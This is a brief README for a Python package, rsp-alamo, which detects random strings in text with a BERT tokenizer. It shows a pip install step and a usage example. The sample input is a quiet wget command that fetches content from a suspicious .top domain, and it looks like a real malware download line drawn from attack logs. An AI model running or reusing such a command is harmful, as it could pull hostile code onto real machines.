# rsp-alamo
Random-string-processing - is a python module for detect random string by BertTokenizer from transformers.

# Quick start guide
You can quickly use rsp-alamo via pip-installation:``
```bash
$ pip/pip3 install rsp-alamo
```

# API example
```python
from rsp.util import RspUtil
rsp_util = RspUtil()
string = "wget -q -O- http://t.jdjdcjq.top/ln/a.asp?rds_20210710*root*dclnmts02." \
         "adderucci.com*3e4812648d32b3808308784c4b69240d227f3cd97906957f65e70b962e9852f2"
print(rsp_util.replace_rs(string))
```
